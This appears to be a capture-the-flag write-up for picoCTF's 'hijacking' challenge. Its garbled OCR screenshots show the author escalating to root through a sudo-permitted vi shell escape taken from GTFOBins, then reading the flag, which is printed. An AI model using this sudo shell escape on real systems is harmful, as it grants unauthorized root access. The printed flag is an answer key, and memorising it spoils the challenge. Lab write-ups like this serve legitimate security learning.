# hijacking
> Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.

> Additional details will be available after launching your challenge instance.

## About the Challenge
We were given an access to SSH server and then there is a file called `.server.py` and if we check the content of the file


[Image extracted text: picoctf@challenge:~$
cat
server .py
import
base64
import
05
import
socket
ip
'picoctf.org
response
05
system( "ping
~C 1
ip)
#saving ping details
to
variable
host info
socket-gethostbyaddr(ip)
#getting IP
from
domaine
host info
to_str
str(host_info[2])
hostinfo
base64.b64encode(host_info_to_str.encode( 'ascii'))
pprint("Hello,
this
is
part
of
information gathering
'Host:
host_info)
picoctf@challenge:~=]


## How to Solve?
Im using unintended way to solve this chall, because if we check the `sudo` configuration


[Image extracted text: picoctf@challenge
~$
Matching Defaults entries
for picoctf
on
challenge:
env_reset,
mail
badpass,
secure_
path-/usr/local/sbin| : /usr/localb
User
picoctf may
run the
following
commands
on
challenge:
(ALL)
lusr/bingvi
(root) NOPASSWD: /usr/bin/python3 /home/picoctf/
server .py
sudo]


There are 2 following commands that we can use, `/usr/bin/vi` or file `.server.py`. In this case im using `/usr/bin/vi` command to do privilege escalation (Im using [GTFOBins](https://gtfobins.github.io/gtfobins/vi/#sudo) to do privilege escalation)


[Image extracted text: picoctf@challenge:~$
sudo
Matching
Defaults entries
for picoctf
on
challenge:
env_reset,
mail_badpass,
secure_path-/usr/local/sbin| : /usr/local
User picoctf
may
run
the following commands
on
challenge:
(ALL)
lusr/bingvi
(root) NOPASSWD: /usr/bin/python3 /home/picoctf/
server .py
picoctf@challenge:~$ sudo vi
Ibin] sh
Idevlnull
sudo] password
for picoctf:
# whoami
root]


And then go to `/root` directory and read `.flag.txt` to obtain the flag


[Image extracted text: SOOe
# 15 -la
total 12
drwx -
root
root
23
Mar
16 02:08
drwxr-xr-x 1
root
root
51 Mar 28 15:29
rW-r--r-
root
root 3106
Dec
2019
bashrc
rW-r--r - 1
root
root
43 Mar 16 02:08
txt
rW-r--r-
root
root
161
Dec
2019
-profile
flag
txt
picoCTF{pYthonn_libraryH! j@CKIng_13cfdBcc}
flag _
cat]


```
picoCTF{pYth0nn_libraryH!j@CK!n9_13cfd3cc}
```